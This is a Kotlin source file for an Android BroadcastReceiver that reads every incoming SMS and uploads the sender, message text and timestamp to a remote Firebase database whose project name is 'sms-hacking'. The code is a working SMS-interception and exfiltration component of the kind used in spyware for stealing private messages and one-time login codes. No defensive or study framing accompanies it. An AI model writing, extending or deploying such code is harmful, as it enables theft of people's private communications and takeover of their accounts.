package com.example.codes.SMS

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Telephony
import android.telephony.SmsMessage
import android.widget.Toast
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION == intent.action) {
            val bundle = intent.extras
            if (bundle != null) {
                val pdus = bundle.get("pdus") as Array<*>
                val messages: Array<SmsMessage?> = arrayOfNulls(pdus.size)
                val smsStringBuilder = StringBuilder()
                var sender = ""

                for (i in pdus.indices) {
                    messages[i] = SmsMessage.createFromPdu(pdus[i] as ByteArray, bundle.getString("format"))
                    sender = messages[i]?.originatingAddress ?: ""
                    val msgBody = messages[i]?.messageBody
                    smsStringBuilder.append(msgBody)
                }

                // Chuẩn bị dữ liệu tin nhắn
                val smsMessageData = mapOf(
                    "sender" to sender,
                    "message" to smsStringBuilder.toString(),
                    "timestamp" to System.currentTimeMillis()
                )

                // Lưu tin nhắn vào Firebase
                saveSmsToFirebase(smsMessageData)

                // Hiển thị Toast thông báo
                Toast.makeText(context, "New SMS Received and saved to Firebase", Toast.LENGTH_SHORT).show()

                // Gửi broadcast để cập nhật UI trong Activity
                val newIntent = Intent("com.example.codes.NEW_SMS_RECEIVED")
                newIntent.putExtra("sms_message", smsStringBuilder.toString())
                context.sendBroadcast(newIntent)
            }
        }
    }

    private fun saveSmsToFirebase(smsData: Map<String, Any>) {
        val database: DatabaseReference = FirebaseDatabase.getInstance("https://sms-hacking-8b10c-default-rtdb.asia-southeast1.firebasedatabase.app/").reference
        val smsRef = database.child("sms_messages").push()

        smsRef.setValue(smsData)
            .addOnSuccessListener {
                // Thành công - Thêm tin nhắn vào Firebase
            }
            .addOnFailureListener { e ->
                // Thất bại - Hiển thị lỗi (có thể log)
                e.printStackTrace()
            }
    }
}
